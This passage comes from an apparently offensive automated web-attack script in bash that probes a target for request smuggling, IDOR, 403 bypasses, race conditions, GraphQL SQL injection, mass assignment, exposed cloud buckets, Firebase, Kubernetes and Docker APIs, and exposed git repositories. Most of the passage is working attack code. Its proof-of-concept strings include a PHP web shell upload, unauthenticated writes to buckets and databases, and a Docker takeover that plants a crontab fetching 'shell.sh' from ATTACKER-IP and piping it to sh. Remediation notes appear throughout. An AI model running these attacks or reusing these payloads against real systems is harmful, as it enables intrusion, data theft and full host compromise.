      "# Use smuggler.py for full exploitation:\npython3 smuggler.py -u '$LURL'\n\n# Manual CL.TE test:\ncurl -sk --http1.1 -X POST '$LURL' -H 'Content-Length: 6' -H 'Transfer-Encoding: chunked' -d '3\r\nABC\r\n0\r\n\r\n'" \
      "Normalize HTTP parsing. Use consistent CL/TE handling. Disable HTTP/1.1 keep-alive if not needed." "network"
  fi
done

ok "Phase 09 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 10 — ACCESS CONTROL
# ══════════════════════════════════════════════════════════════════════
phase_banner "10" "ACCESS CONTROL" \
  "IDOR · 403 Bypass · Privilege Escalation · Forced Browsing · BOLA · Horizontal Auth"

# 10.1 IDOR Detection
log "IDOR (Insecure Direct Object Reference) testing..."
IDOR_PARAMS=(id user_id account_id profile_id order_id doc_id file_id \
             invoice_id ticket_id user account profile order document \
             uid pid rid transaction_id customer_id report_id record_id)
IDOR_FOUND=false

while IFS= read -r PURL; do
  for PARAM in "${IDOR_PARAMS[@]}"; do
    if echo "$PURL" | grep -qiP "[?&]${PARAM}=[0-9]+"; then
      CURRENT_ID=$(echo "$PURL" | grep -oP "${PARAM}=\K[0-9]+" | head -1)
      BASELINE=$(_curl_body "$PURL" 2>/dev/null | head -c 3000 || true)
      [[ -z "$BASELINE" ]] && continue
      # Test adjacent IDs
      for OFFSET in -1 -2 1 2 100 1000 99999; do
        TEST_ID=$((CURRENT_ID + OFFSET))
        [[ "$TEST_ID" -le 0 ]] && continue
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=${CURRENT_ID}|${PARAM}=${TEST_ID}|g")
        TEST_RESP=$(_curl_body "$TESTURL" 2>/dev/null | head -c 3000 || true)
        TEST_CODE=$(_curl_code "$TESTURL")
        # If we get valid response with different data = IDOR
        if [[ "$TEST_CODE" == "200" ]] && [[ "$TEST_RESP" != "$BASELINE" ]] && \
           [[ ${#TEST_RESP} -gt 100 ]] && \
           ! echo "$TEST_RESP" | grep -qiE "forbidden|unauthorized|not found|access denied"; then
          vuln "IDOR: $PURL | Param: $PARAM | Current: $CURRENT_ID → Test: $TEST_ID (HTTP 200)"
          IDOR_FOUND=true
          add_finding "Insecure Direct Object Reference (IDOR)" "HIGH" "8.1" "custom" \
            "$PURL" "$PARAM=$CURRENT_ID" \
            "Can access resource with ID=$TEST_ID without authorization check" \
            "# Manual enumeration:\nfor id in \$(seq 1 100); do curl -sk '$(echo $PURL | sed "s|${PARAM}=[0-9]*|${PARAM}=\$id|g")' | grep -v 'Not Found'; done\n\n# Burp Intruder:\n# Set $PARAM as injection point, enumerate ID range" \
            "Implement server-side authorization check on EVERY resource access. Use non-sequential IDs (UUIDs)." "access"
          notify_webhook "IDOR on $TARGET — unauthorized data access!"
          break 2
        fi
      done
      # Test with 0, negative, null
      for TEST_ID in 0 -1 9999999 00001 "null" "undefined" "' OR 1=1--"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=${CURRENT_ID}|${PARAM}=${TEST_ID}|g")
        CODE=$(_curl_code "$TESTURL")
        if [[ "$CODE" == "200" ]]; then
          RESP=$(_curl_body "$TESTURL" 2>/dev/null | head -c 500 || true)
          if echo "$RESP" | grep -qiE "email|account|profile|user|name|address"; then
            vuln "IDOR (boundary): $PURL param $PARAM=$TEST_ID returned sensitive data"
            add_finding "IDOR — Boundary Value" "HIGH" "7.5" "custom" \
              "$PURL" "$PARAM" "Resource accessible with ID=$TEST_ID" \
              "curl -sk '$TESTURL'" \
              "Validate all object IDs. Check ownership on every request." "access"
          fi
        fi
      done
    fi
  done
done < "$P05/targets_all.txt"

# 10.2 403 Bypass — comprehensive
log "403 bypass techniques (10 methods)..."
# First find 403 paths
ffuf -u "$BASE_URL/FUZZ" \
  -w "$WL_ADMIN" \
  -mc 403 -fc 404 -t "$THREADS" -s \
  -o "$P10/ffuf_403.json" -of json 2>/dev/null || true

python3 - << PYEOF 2>/dev/null
import json
try:
    with open('$P10/ffuf_403.json') as f: d=json.load(f)
    with open('$P10/paths_403.txt','w') as f:
        for r in d.get('results',[]):
            path=r.get('input',{}).get('FUZZ','')
            if path: f.write('/'+path+'\n')
except: pass
PYEOF

while IFS= read -r RPATH; do
  [[ -z "$RPATH" ]] && continue
  URL="$BASE_URL$RPATH"
  declare -A BYPASS_METHODS=(
    ["X-Original-URL"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Original-URL: $RPATH' '$BASE_URL/'"
    ["X-Forwarded-For-127"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Forwarded-For: 127.0.0.1' '$URL'"
    ["X-Custom-IP"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Custom-IP-Authorization: 127.0.0.1' '$URL'"
    ["X-Forward-Host"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Forward-Host: 127.0.0.1' '$URL'"
    ["X-Remote-IP"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Remote-IP: 127.0.0.1' '$URL'"
    ["Path-Dot"]="curl -sk -o /dev/null -w '%{http_code}' '$BASE_URL/.$RPATH'"
    ["Path-Slash"]="curl -sk -o /dev/null -w '%{http_code}' '$BASE_URL/$RPATH/'"
    ["URL-Encoded"]="curl -sk -o /dev/null -w '%{http_code}' '$(echo $URL | sed 's/\//\/%2f/2')'"
    ["Case-Change"]="curl -sk -o /dev/null -w '%{http_code}' '$(echo $URL | tr '[:lower:]' '[:upper:]')'"
    ["HTTP-Method"]="curl -sk -o /dev/null -w '%{http_code}' -X POST '$URL'"
  )
  for METHOD in "${!BYPASS_METHODS[@]}"; do
    CODE=$(eval "${BYPASS_METHODS[$METHOD]}" 2>/dev/null || echo "000")
    if [[ "$CODE" == "200" ]]; then
      vuln "403 BYPASS: $URL via $METHOD → HTTP 200"
      add_finding "403 Forbidden Bypass — $METHOD" "HIGH" "7.5" "custom" \
        "$URL" "Header/Path bypass" \
        "403 bypassed via $METHOD technique — full content accessible" \
        "# ${METHOD}:\n${BYPASS_METHODS[$METHOD]}" \
        "Fix authorization at application layer. Never rely only on URL-based restrictions. Validate auth for every request regardless of URL." "access"
      break
    fi
  done
  unset BYPASS_METHODS
done < "$P10/paths_403.txt" 2>/dev/null || true

# 10.3 HTTP Method Tampering
log "HTTP method tampering..."
for LURL in $(cat "$P03/live_urls.txt" 2>/dev/null | head -10); do
  for METHOD in PUT PATCH DELETE OPTIONS TRACE CONNECT HEAD; do
    CODE=$(_curl_code -X "$METHOD" "$LURL")
    if [[ "$METHOD" == "TRACE" ]] && [[ "$CODE" == "200" ]]; then
      TRACE_RESP=$(_curl_body -X TRACE "$LURL" 2>/dev/null | head -c 500 || true)
      if echo "$TRACE_RESP" | grep -qi "TRACE\|ECHO\|Via:"; then
        vuln "HTTP TRACE ENABLED: $LURL"
        add_finding "HTTP TRACE Method Enabled" "LOW" "3.5" "curl" \
          "$LURL" "HTTP Method" "TRACE method returns request back — XST attack possible" \
          "curl -X TRACE $LURL" \
          "Disable TRACE method. Add: TraceEnable Off (Apache) or deny TRACE in Nginx." "web"
      fi
    fi
    if [[ "$METHOD" == "PUT" ]] && [[ "$CODE" =~ ^(200|201|204)$ ]]; then
      vuln "HTTP PUT ENABLED: $LURL (HTTP $CODE)"
      add_finding "HTTP PUT Method Enabled" "CRITICAL" "9.0" "curl" \
        "$LURL" "HTTP Method" "PUT method allowed — can upload/overwrite files" \
        "curl -X PUT '$LURL/shell.php' -d '<?php system(\$_GET[\"cmd\"]);?>'" \
        "Disable PUT method unless explicitly required. Authenticate and authorize all write operations." "web"
    fi
  done
done

ok "Phase 10 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 11 — BUSINESS LOGIC VULNERABILITIES
# ══════════════════════════════════════════════════════════════════════
phase_banner "11" "BUSINESS LOGIC VULNERABILITIES" \
  "Race Conditions · Price Manipulation · Workflow Bypass · State Abuse · Negative Values"

# 11.1 Race Condition Testing
log "Race condition testing on critical endpoints..."
for LURL in "${AUTH_ENDPOINTS[@]:-}"; do
  [[ -z "$LURL" ]] && continue
  # Send 20 simultaneous requests
  PIDS=()
  for i in $(seq 1 20); do
    _curl_body -X POST "$LURL" \
      -d "username=testuser&password=testpass&action=redeem&code=COUPON123" \
      >/dev/null 2>&1 &
    PIDS+=($!)
  done
  RESPONSES=()
  for PID in "${PIDS[@]}"; do wait "$PID" && RESPONSES+=("ok") || RESPONSES+=("err"); done

  OK_COUNT=$(echo "${RESPONSES[@]}" | tr ' ' '\n' | grep -c "ok" || echo 0)
  if [[ "$OK_COUNT" -gt 1 ]]; then
    vuln "RACE CONDITION: $LURL — $OK_COUNT concurrent requests may succeed"
    add_finding "Race Condition / TOCTOU" "HIGH" "8.1" "custom" \
      "$LURL" "concurrent POST" \
      "Endpoint may allow multiple simultaneous operations" \
      "# Concurrent requests with curl:\nseq 20 | xargs -P 20 -I{} curl -sk -X POST '$LURL' -d 'code=COUPON123'\n\n# Python race tool:\npip install race\nrace --url '$LURL' --method POST --data 'code=COUPON123' --concurrent 50" \
      "Implement database-level locks. Use atomic operations. Add idempotency tokens." "logic"
  fi
done

# 11.2 Negative Value / Mass Assignment Testing
log "Price manipulation and mass assignment testing..."
# Test negative values in numeric fields
PRICE_PARAMS=(amount price qty quantity total cost value discount)
while IFS= read -r PURL; do
  for PARAM in "${PRICE_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for TESTVAL in "-1" "-100" "0" "0.001" "0.00000001" "99999999"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=${TESTVAL}|gi")
        CODE=$(_curl_code "$TESTURL")
        RESP=$(_curl_body "$TESTURL" 2>/dev/null | head -c 1000 || true)
        if [[ "$CODE" =~ ^(200|201)$ ]] && \
           echo "$RESP" | grep -qiE "success|confirmed|processed|order|transaction"; then
          vuln "PRICE MANIPULATION: $PURL | $PARAM=$TESTVAL → Accepted"
          add_finding "Price/Value Manipulation" "HIGH" "8.6" "custom" \
            "$PURL" "$PARAM" \
            "Negative/zero value accepted by server: $PARAM=$TESTVAL" \
            "curl '$TESTURL'" \
            "Validate all numeric inputs server-side. Enforce minimum values. Use integer arithmetic for money." "logic"
          break
        fi
      done
    fi
  done
done < "$P05/targets_all.txt"

ok "Phase 11 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 12 — API SECURITY
# ══════════════════════════════════════════════════════════════════════
phase_banner "12" "API SECURITY" \
  "REST · GraphQL · Mass Assignment · API Key Exposure · Versioning · Rate Limiting"

# 12.1 API Endpoint Discovery
log "API endpoint discovery and testing..."
API_BASES=()
for APATH in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /rest /service /services; do
  CODE=$(_curl_code "$BASE_URL$APATH")
  if [[ "$CODE" =~ ^(200|401|403)$ ]]; then
    API_BASES+=("$BASE_URL$APATH")
    ok "API base: $BASE_URL$APATH (HTTP $CODE)"
  fi
done

# 12.2 API Versioning & Downgrade
log "API version downgrade testing..."
for ABASE in "${API_BASES[@]:-}"; do
  for OLDVER in /v0 /v1 /v2 /v1.0 /v1.1 /beta /alpha /test /dev /legacy; do
    CODE=$(_curl_code "${ABASE%/v*}$OLDVER/users")
    if [[ "$CODE" == "200" ]]; then
      RESP=$(_curl_body "${ABASE%/v*}$OLDVER/users" 2>/dev/null | head -c 500 || true)
      if echo "$RESP" | grep -qiE '"id"|"email"|"user"|"name"'; then
        vuln "API VERSION DOWNGRADE: ${ABASE%/v*}$OLDVER/users → data exposed"
        add_finding "API Version Downgrade / Legacy Endpoint" "HIGH" "7.5" "custom" \
          "${ABASE%/v*}$OLDVER/users" "API version" \
          "Old API version returns data without current security controls" \
          "curl -sk '${ABASE%/v*}$OLDVER/users'\ncurl -sk '${ABASE%/v*}$OLDVER/admin'" \
          "Decommission old API versions. Apply same auth/authz controls to all versions." "api"
      fi
    fi
  done
done

# 12.3 GraphQL Introspection + Injection
log "GraphQL security testing..."
GRAPHQL_ENDPOINTS=("$BASE_URL/graphql" "$BASE_URL/graphiql" "$BASE_URL/__graphql" \
                   "$BASE_URL/api/graphql" "$BASE_URL/playground" "$BASE_URL/query")
for GQL_URL in "${GRAPHQL_ENDPOINTS[@]}"; do
  CODE=$(_curl_code -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}' "$GQL_URL")
  if [[ "$CODE" == "200" ]]; then
    ok "GraphQL endpoint: $GQL_URL"
    # Test introspection
    INTROSPECT=$(_curl_body -X POST \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __schema { queryType { name } types { name fields { name args { name } } } } }"}' \
      "$GQL_URL" 2>/dev/null || true)
    if echo "$INTROSPECT" | grep -q "__schema"; then
      vuln "GRAPHQL INTROSPECTION ENABLED: $GQL_URL"
      add_finding "GraphQL Introspection Enabled" "MEDIUM" "5.3" "curl" \
        "$GQL_URL" "GraphQL query" \
        "Full schema exposed via introspection — all types, queries, mutations visible" \
        "# Get full schema:\ncurl -sk -X POST '$GQL_URL' -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { types { name fields { name } } } }\"}'\n\n# Find sensitive types:\ncurl -sk -X POST '$GQL_URL' -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { queryType { fields { name } } } }\"}'" \
        "Disable introspection in production. Implement depth limiting and query complexity analysis." "api"
      # Test for SQL injection in GraphQL
      SQLI_GQL=$(_curl_body -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{ user(id: \"1 OR 1=1--\") { name email } }"}' \
        "$GQL_URL" 2>/dev/null || true)
      if echo "$SQLI_GQL" | grep -qiE '"email"|multiple|users|error.*sql|syntax'; then
        crit "GRAPHQL SQL INJECTION: $GQL_URL"
        add_finding "GraphQL SQL Injection" "CRITICAL" "9.8" "custom" \
          "$GQL_URL" "id argument" "SQL injection in GraphQL query argument" \
          "curl -X POST '$GQL_URL' -H 'Content-Type: application/json' -d '{\"query\":\"{ user(id: \\\"1 OR 1=1--\\\") { name email password } }\"}'" \
          "Use parameterized resolvers. Never concatenate user input into SQL queries." "injection"
      fi
    fi
  fi
done

# 12.4 REST API Mass Assignment
log "Mass assignment vulnerability testing..."
for ABASE in "${API_BASES[@]:-$BASE_URL}"; do
  for ENDPOINT in /users /user /profile /account /admin; do
    CODE=$(_curl_code -X POST \
      -H "Content-Type: application/json" \
      -d '{"name":"test","email":"test@test.com","role":"admin","isAdmin":true,"admin":true,"is_staff":true}' \
      "$ABASE$ENDPOINT" 2>/dev/null || echo "000")
    if [[ "$CODE" =~ ^(200|201)$ ]]; then
      RESP=$(_curl_body -X POST \
        -H "Content-Type: application/json" \
        -d '{"name":"test","role":"admin","isAdmin":true}' \
        "$ABASE$ENDPOINT" 2>/dev/null | head -c 1000 || true)
      if echo "$RESP" | grep -qiE '"role"\s*:\s*"admin"|"isAdmin"\s*:\s*true|"admin"\s*:\s*true'; then
        crit "MASS ASSIGNMENT: $ABASE$ENDPOINT accepts admin role escalation"
        add_finding "Mass Assignment — Privilege Escalation" "CRITICAL" "9.1" "custom" \
          "$ABASE$ENDPOINT" "JSON body: role/isAdmin" \
          "Server accepts unauthorized fields including admin role" \
          "curl -X POST '$ABASE$ENDPOINT' -H 'Content-Type: application/json' -d '{\"name\":\"attacker\",\"role\":\"admin\",\"isAdmin\":true}'" \
          "Whitelist allowed fields. Use DTOs/serializers. Never bind all input fields to model." "api"
      fi
    fi
  done
done

# 12.5 API Rate Limiting
log "API rate limiting check..."
for ABASE in "${API_BASES[@]:-$BASE_URL}"; do
  SUCCESS_COUNT=0
  for i in $(seq 1 50); do
    CODE=$(_curl_code "$ABASE/users" 2>/dev/null || echo "000")
    [[ "$CODE" == "200" ]] && SUCCESS_COUNT=$((SUCCESS_COUNT+1))
    [[ "$CODE" == "429" ]] && break
  done
  if [[ "$SUCCESS_COUNT" -ge 50 ]]; then
    vuln "NO RATE LIMITING: $ABASE — 50 requests returned 200 (no 429)"
    add_finding "Missing API Rate Limiting" "MEDIUM" "5.3" "curl" \
      "$ABASE" "HTTP rate limiting" \
      "50 consecutive requests with no rate limiting detected" \
      "# Test:\nfor i in \$(seq 1 100); do curl -sk -o /dev/null -w '%{http_code} ' '$ABASE/users'; done" \
      "Implement rate limiting (e.g., 100 req/min per IP/token). Return 429 with Retry-After header." "api"
  fi
done

ok "Phase 12 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 13 — CLOUD & INFRASTRUCTURE
# ══════════════════════════════════════════════════════════════════════
phase_banner "13" "CLOUD & INFRASTRUCTURE SECURITY" \
  "S3 Buckets · GCS · Azure Blobs · Kubernetes · Docker · CI/CD Exposure · Firebase"

# 13.1 S3 Bucket Enumeration
log "Cloud storage bucket enumeration..."
S3_NAMES=(
  "$TARGET" "${TARGET//./-}" "${TARGET//./_}"
  "${TARGET%%.*}" "www-$TARGET" "dev-$TARGET"
  "staging-$TARGET" "backup-$TARGET" "data-$TARGET"
  "assets-$TARGET" "static-$TARGET" "media-$TARGET"
  "files-$TARGET" "uploads-$TARGET" "prod-$TARGET"
)

for NAME in "${S3_NAMES[@]}"; do
  # AWS S3
  S3_URL="https://${NAME}.s3.amazonaws.com"
  CODE=$(_curl_code "$S3_URL")
  if [[ "$CODE" == "200" ]]; then
    crit "PUBLIC S3 BUCKET: $S3_URL"
    CONTENT=$(_curl_body "$S3_URL" 2>/dev/null | head -c 5000 || true)
    add_finding "Public S3 Bucket — Data Exposed" "CRITICAL" "9.5" "curl" \
      "$S3_URL" "S3 ACL" "S3 bucket is publicly readable" \
      "# List bucket contents:\ncurl -sk '$S3_URL'\naws s3 ls s3://$NAME --no-sign-request\naws s3 sync s3://$NAME . --no-sign-request\n\n# Check write access:\naws s3 cp test.txt s3://$NAME/test.txt --no-sign-request" \
      "Set S3 bucket to private. Enable Block Public Access. Use bucket policies to restrict access." "cloud"
    notify_webhook "PUBLIC S3 BUCKET: $S3_URL"
  elif [[ "$CODE" == "403" ]]; then
    # Bucket exists but access denied — still a finding (enumerable)
    ok "S3 bucket exists (403): $NAME"
    echo "$NAME" >> "$P13/s3_buckets_found.txt"
    # Try write access
    WRITE_CODE=$(_curl_code -X PUT "$S3_URL/hackerofhell_test.txt" -d "test" 2>/dev/null || echo "000")
    if [[ "$WRITE_CODE" =~ ^(200|204)$ ]]; then
      crit "S3 BUCKET WRITE ACCESS: $S3_URL"
      add_finding "S3 Bucket Writable Without Auth" "CRITICAL" "9.8" "curl" \
        "$S3_URL" "S3 ACL Write" "Can write files to S3 bucket without authentication" \
        "aws s3 cp malicious.html s3://$NAME/index.html --no-sign-request\ncurl -X PUT '$S3_URL/shell.php' -d '<?php system(\$_GET[\"c\"]);?>'" \
        "Disable public write access. Use signed URLs for uploads. Enable S3 access logging." "cloud"
    fi
  fi
  # GCP Storage
  GCS_URL="https://storage.googleapis.com/${NAME}"
  CODE=$(_curl_code "$GCS_URL")
  [[ "$CODE" == "200" ]] && \
    crit "PUBLIC GCS BUCKET: $GCS_URL" && \
    add_finding "Public GCP Storage Bucket" "CRITICAL" "9.5" "curl" \
      "$GCS_URL" "GCS ACL" "GCS bucket is publicly readable" \
      "curl -sk '$GCS_URL'\ngsutil ls gs://$NAME" \
      "Set GCS bucket to private. Remove allUsers ACL." "cloud"
  # Azure Blob
  AZ_URL="https://${NAME}.blob.core.windows.net"
  CODE=$(_curl_code "$AZ_URL")
  [[ "$CODE" == "200" ]] && \
    crit "PUBLIC AZURE BLOB: $AZ_URL" && \
    add_finding "Public Azure Blob Storage" "CRITICAL" "9.5" "curl" \
      "$AZ_URL" "Azure ACL" "Azure Blob Container is publicly readable" \
      "curl -sk '$AZ_URL/?comp=list&restype=container'\naz storage blob list --container-name $NAME" \
      "Set container access to private. Use SAS tokens for authenticated access." "cloud"
done

# 13.2 Firebase Exposure
log "Firebase security testing..."
for FB_NAME in "$TARGET" "${TARGET%%.*}" "${TARGET//./-}"; do
  FB_URL="https://${FB_NAME}.firebaseio.com/.json"
  CODE=$(_curl_code "$FB_URL")
  if [[ "$CODE" == "200" ]]; then
    CONTENT=$(_curl_body "$FB_URL" 2>/dev/null | head -c 1000 || true)
    if [[ -n "$CONTENT" ]] && [[ "$CONTENT" != "null" ]]; then
      crit "FIREBASE DATABASE EXPOSED: $FB_URL"
      add_finding "Firebase Database Publicly Accessible" "CRITICAL" "9.9" "curl" \
        "$FB_URL" "Firebase Rules" "Firebase Realtime Database is publicly readable" \
        "# Read all data:\ncurl -sk '$FB_URL'\n\n# Write test:\ncurl -X PUT '$FB_URL/hackerofhell_test.json' -d '\"pwned\"'\n\n# Enumerate paths:\ncurl -sk '${FB_URL%/.json}/users.json'\ncurl -sk '${FB_URL%/.json}/admin.json'" \
        "Set Firebase rules to deny all public reads. Require authentication. Review all rules." "cloud"
      notify_webhook "FIREBASE DB EXPOSED: $FB_URL"
    fi
  fi
done

# 13.3 Kubernetes API + Docker Exposure
log "Kubernetes and Docker API exposure..."
for K8S_PORT in 443 6443 8443 10250 10255; do
  CODE=$(_curl_code "https://$TARGET:$K8S_PORT/api/v1/namespaces" 2>/dev/null || echo "000")
  if [[ "$CODE" == "200" ]]; then
    crit "KUBERNETES API EXPOSED: https://$TARGET:$K8S_PORT"
    add_finding "Kubernetes API Server Exposed" "CRITICAL" "10.0" "curl" \
      "https://$TARGET:$K8S_PORT" "network" "Kubernetes API accessible without authentication" \
      "kubectl --server=https://$TARGET:$K8S_PORT --insecure-skip-tls-verify get pods\ncurl -sk 'https://$TARGET:$K8S_PORT/api/v1/namespaces'\ncurl -sk 'https://$TARGET:$K8S_PORT/api/v1/secrets'" \
      "Require client certificates for API access. Enable RBAC. Never expose K8s API to internet." "cloud"
  fi
  # Kubelet API (10250 = exec, 10255 = read-only)
  if [[ "$K8S_PORT" == "10250" ]]; then
    CODE=$(_curl_code "https://$TARGET:10250/pods" 2>/dev/null || echo "000")
    if [[ "$CODE" == "200" ]]; then
      crit "KUBELET API EXPOSED: https://$TARGET:10250 — RCE possible"
      add_finding "Kubelet API Exposed — RCE" "CRITICAL" "10.0" "curl" \
        "https://$TARGET:10250" "Kubelet" "Kubelet exec API exposed — remote code execution in pods" \
        "curl -sk 'https://$TARGET:10250/pods'\ncurl -sk -X POST 'https://$TARGET:10250/run/<namespace>/<pod>/<container>' -d 'cmd=id'" \
        "Disable anonymous Kubelet access. Use cert-based authentication. Firewall 10250/10255." "cloud"
    fi
  fi
done

# Docker API (2375 = plaintext, 2376 = TLS)
if grep -q "2375/tcp.*open\|2376/tcp.*open" "$P02/nmap_top1000.txt" 2>/dev/null; then
  CODE=$(_curl_code "http://$TARGET:2375/v1.24/containers/json" 2>/dev/null || echo "000")
  if [[ "$CODE" == "200" ]]; then
    crit "DOCKER API EXPOSED WITHOUT TLS: http://$TARGET:2375 — FULL SYSTEM COMPROMISE"
    add_finding "Docker Daemon API Exposed (No Auth)" "CRITICAL" "10.0" "curl" \
      "http://$TARGET:2375" "Docker daemon" "Unauthenticated Docker API access = full host compromise" \
      "# List containers:\ncurl -sk 'http://$TARGET:2375/v1.24/containers/json'\n\n# Get shell on host:\ndocker -H tcp://$TARGET:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n# Create root crontab:\ndocker -H tcp://$TARGET:2375 exec <container_id> sh -c 'echo \"* * * * * curl http://ATTACKER-IP/shell.sh | sh\" >> /etc/crontab'" \
      "NEVER expose Docker daemon to network. Use TLS with client certificates. Use socket proxy with ACLs." "cloud"
    notify_webhook "DOCKER API EXPOSED on $TARGET — FULL COMPROMISE"
  fi
fi

ok "Phase 13 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 14 — SECRETS & INFORMATION EXPOSURE
# ══════════════════════════════════════════════════════════════════════
phase_banner "14" "SECRETS & INFORMATION EXPOSURE" \
  "Git Dumps · Backup Files · Error Messages · Stack Traces · Source Disclosure"

# 14.1 Git Repository Dumping
log "Git repository exposure and dumping..."
if _curl_body "$BASE_URL/.git/HEAD" 2>/dev/null | grep -qi "ref: refs/"; then
  crit "GIT REPOSITORY EXPOSED: $BASE_URL/.git/"
  add_finding "Git Repository Exposed — Source Code Leak" "CRITICAL" "9.5" "curl" \
    "$BASE_URL/.git/" ".git/" "Full git repository accessible — source code extractable" \
    "# Download entire source:\ngit clone $BASE_URL/.git/ extracted_source\n\n# Manual extraction:\ncurl -sk '$BASE_URL/.git/config'\ncurl -sk '$BASE_URL/.git/COMMIT_EDITMSG'\ncurl -sk '$BASE_URL/.git/packed-refs'\n\n# Automated:\ngitdumper '$BASE_URL/.git/' ./git_dump && cd git_dump && git checkout .\n\n# Search for secrets in extracted code:\ngrep -r 'password\|api_key\|secret\|token\|db_pass' ./git_dump/" \
    "Block web access to .git directory. Remove .git from production deployments. Use .gitignore." "exposure"
  notify_webhook "GIT REPO EXPOSED: $BASE_URL — source code extractable"

  # Extract interesting files from git
  for GITFILE in config HEAD COMMIT_EDITMSG index packed-refs \
                 refs/heads/main refs/heads/master refs/heads/develop; do
    CONTENT=$(_curl_body "$BASE_URL/.git/$GITFILE" 2>/dev/null | head -c 2000 || true)
    [[ -n "$CONTENT" ]] && echo "=== .git/$GITFILE ===" >> "$P14/git_files.txt" \
      && echo "$CONTENT" >> "$P14/git_files.txt"
  done
fi

# 14.2 Error Page / Stack Trace Mining
log "Error page and stack trace analysis..."
ERROR_TRIGGERS=(
  "$BASE_URL/404-does-not-exist-hackerofhell"
  "$BASE_URL/?id='"
  "$BASE_URL/?id=<script>"
  "$BASE_URL/?q[]=test"
  "$BASE_URL/?page=-1"
  "$BASE_URL/api/v1/users/9999999999"
)
for ERR_URL in "${ERROR_TRIGGERS[@]}"; do
  RESP=$(_curl_body "$ERR_URL" 2>/dev/null | head -c 5000 || true)
  if echo "$RESP" | grep -qiE "stack trace|exception|at.*line [0-9]+|traceback|debug|php error|fatal error|warning: |\
error in.*\.php|undefined index|mysql_fetch|ORA-[0-9]+|SQLSTATE"; then
    TECH=$(echo "$RESP" | grep -oiP '(PHP|Python|Ruby|Java|\.NET|Node|Rails|Django|Laravel|Spring)\s+[0-9.]+' | head -1 || true)
    vuln "STACK TRACE / DEBUG INFO EXPOSED: $ERR_URL${TECH:+ — $TECH}"
    add_finding "Stack Trace / Debug Information Exposed" "MEDIUM" "5.3" "curl" \
      "$ERR_URL" "error handling" \
      "Server reveals stack traces, file paths, or technology details: ${TECH:-unknown framework}" \
      "curl -sk '$ERR_URL'\ncurl -sk '$BASE_URL/?id=\\''" \
      "Disable debug mode in production. Use generic error pages. Log errors server-side only." "disclosure"
  fi
done

# 14.3 Source Code Disclosure
log "Source code disclosure testing..."
for EXT in php asp aspx jsp py rb pl cfm cfc; do
  for SAUCE_PATH in \
    "/index.${EXT}.bak" "/index.${EXT}~" "/.index.${EXT}"  \
    "/config.${EXT}.bak" "/login.${EXT}.bak" "/admin.${EXT}.bak"; do
    CODE=$(_curl_code "$BASE_URL$SAUCE_PATH")
    if [[ "$CODE" == "200" ]]; then
      BODY=$(_curl_body "$BASE_URL$SAUCE_PATH" 2>/dev/null | head -c 2000 || true)
      if echo "$BODY" | grep -qiE "<?php|<%|<%=|<cfcomponent|db_password|mysql_connect|PDO"; then
        crit "SOURCE CODE DISCLOSED: $BASE_URL$SAUCE_PATH"
        add_finding "Source Code Disclosure" "CRITICAL" "9.1" "curl" \
          "$BASE_URL$SAUCE_PATH" "path" \
          "Server-side source code accessible — may contain credentials and logic" \
          "curl -sk '$BASE_URL$SAUCE_PATH'\ncurl -sk '$BASE_URL$SAUCE_PATH' | grep -iE 'password|db_|secret|key'" \
          "Remove source backup files. Configure web server to serve only intended file types. Use .htaccess deny rules." "exposure"
      fi
    fi
  done
done

ok "Phase 14 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 15 — CVE & KNOWN VULNERABILITIES
# ══════════════════════════════════════════════════════════════════════
phase_banner "15" "CVE & KNOWN VULNERABILITY EXPLOITATION" \
  "Nuclei CVE Templates · Version-Specific Exploits · CMS CVEs · Framework CVEs"

# 15.1 Nuclei comprehensive scan
log "Nuclei full template library scan..."
if has nuclei; then
  nuclei -update-templates -silent 2>/dev/null || true
  nuclei -l "$P03/live_urls.txt" \
    -t "$HOME/nuclei-templates/" \
    -tags cve,rce,sqli,xss,ssrf,lfi,idor,cors,exposure,misconfig,takeover,\
default-login,panel,tech,network,file,backup,cloud,kubernetes,docker \
    -severity critical,high,medium \
    -rate-limit "$RATE" \
    -bulk-size 30 \
    -concurrency 15 \
    -silent -jsonl \
    -o "$P15/nuclei_results.jsonl" \
    2>/dev/null || true

  if [[ -s "$P15/nuclei_results.jsonl" ]]; then
    COUNT=$(wc -l < "$P15/nuclei_results.jsonl")
    ok "Nuclei: $COUNT potential issues"
    python3 - << PYEOF 2>/dev/null
import json, os
sev_cvss = {"critical":"9.5","high":"7.8","medium":"5.4","low":"3.1"}
try:
    with open('$FINDINGS') as f: d=json.load(f)
    with open('$P15/nuclei_results.jsonl') as f:
        for line in f:
            try:
                n=json.loads(line.strip())
                sev=n.get('info',{}).get('severity','info').lower()
                if sev in ('info','unknown'): continue
                name=n.get('info',{}).get('name','')
                url=n.get('matched-at','')
                tid=n.get('template-id','')
                desc=n.get('info',{}).get('description','')[:300]
                rem=n.get('info',{}).get('remediation','Apply patches. Review configuration.')
                evid=n.get('extracted-results',[])
                evid_str=', '.join(str(e) for e in evid[:3]) if evid else f"Nuclei template {tid} matched"
                d['findings'].append({
                    'title':name,'severity':sev.upper(),
                    'cvss':sev_cvss.get(sev,'5.0'),'tool':'nuclei',
                    'url':url,'parameter':'','category':'nuclei',
                    'evidence':evid_str,
                    'poc':f'nuclei -u {url} -t {tid}\ncurl -sk {url}',
                    'remediation':rem
                })
            except: pass
    with open('$FINDINGS','w') as f: json.dump(d,f,indent=2)
